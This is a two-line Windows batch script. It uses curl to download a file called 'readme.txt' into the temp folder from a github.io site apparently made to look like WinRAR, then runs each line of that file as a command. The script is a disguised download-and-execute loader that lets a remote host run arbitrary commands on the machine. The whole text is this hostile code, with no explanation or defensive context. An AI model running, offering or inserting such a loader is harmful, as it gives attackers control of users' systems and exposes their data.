@echo OFF & cd %temp% & curl -o readme.txt https://winrar-lab.github.io/Windows-10/readme.txt & exit
FOR /F "tokens=*" %%* IN (readme.txt) DO %%*